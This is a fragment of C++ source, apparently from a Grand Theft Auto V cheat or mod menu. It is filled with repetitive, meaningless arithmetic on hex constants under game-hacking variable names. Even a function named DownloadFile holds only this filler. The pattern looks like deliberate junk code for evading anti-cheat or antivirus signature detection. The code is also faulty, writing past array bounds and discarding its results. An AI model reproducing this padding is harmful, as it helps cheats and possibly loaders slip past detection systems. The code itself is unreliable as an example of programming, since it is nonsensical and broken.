					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
		}
	}
	namespace WEB
	{
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		void DownloadFile(std::string URL, std::string DiretorioENomeDoArquivo)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
